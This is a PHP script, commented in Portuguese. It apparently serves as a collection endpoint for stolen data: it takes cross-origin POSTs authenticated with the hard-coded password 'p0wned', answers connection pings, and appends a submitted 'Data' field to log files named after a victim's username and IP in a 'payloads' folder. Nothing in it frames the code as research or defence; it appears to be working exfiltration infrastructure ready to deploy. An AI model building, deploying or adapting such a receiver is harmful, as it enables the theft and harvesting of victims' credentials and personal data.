<?php
// Configuração de autenticação
$AUTH_PASS = 'p0wned';
$PAYLOAD_DIR = __DIR__ . '/payloads';

// Configuração de CORS e cabeçalhos
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

// Verifica se a requisição é OPTIONS (preflight)
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Verifica se está no diretório /deploy
$script_path = $_SERVER['SCRIPT_NAME'];
if (strpos($script_path, '/deploy/') !== 0 && strpos($script_path, '/deploy') !== 0) {
    http_response_code(403);
    echo json_encode(['error' => 'Access denied. This script must be accessed via /deploy directory']);
    exit();
}

// Verifica se é uma requisição POST
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Processa os dados recebidos
$rawData = file_get_contents('php://input');
$payload = json_decode($rawData, true);

// Validação dos dados
if (!$payload) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON data']);
    exit();
}

// Verifica autenticação
if (!isset($payload['passwd']) || $payload['passwd'] !== $AUTH_PASS) {
    http_response_code(401);
    echo json_encode(['error' => 'Authentication failed']);
    exit();
}

// Verifica se há dados para processar
if (empty($payload['Data'])) {
    // Se for apenas teste de conexão
    if (isset($payload['ping']) && $payload['ping'] === true) {
        echo json_encode(['status' => 'connected', 'message' => 'Connection successful']);
        exit();
    }
    
    http_response_code(400);
    echo json_encode(['error' => 'No data to process']);
    exit();
}

// Cria o diretório se não existir
if (!is_dir($PAYLOAD_DIR)) {
    mkdir($PAYLOAD_DIR, 0755, true);
}

// Sanitiza os dados para o nome do arquivo
$username = preg_replace('/[^a-zA-Z0-9_-]/', '_', $payload['username'] ?? 'unknown');
$ip = str_replace('.', '_', $payload['ip'] ?? 'unknown');
$filename = "{$username}_{$ip}.log";

// Prepara o conteúdo para gravação
$timestamp = date('[d/m/Y] - H:i:s > ');
$content = "---==\n" . $timestamp . $payload['Data'] . "\n";

// Tenta gravar o arquivo
try {
    $result = file_put_contents(
        $PAYLOAD_DIR . '/' . $filename,
        $content,
        FILE_APPEND | LOCK_EX
    );
    
    if ($result === false) {
        throw new Exception('Failed to write file');
    }
    
    // Resposta de sucesso
    echo json_encode([
        'status' => 'ok',
        'message' => 'Data received successfully',
        'file' => $filename,
        'size' => strlen($content)
    ]);
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'error' => 'Failed to process request',
        'message' => $e->getMessage()
    ]);
}


?>
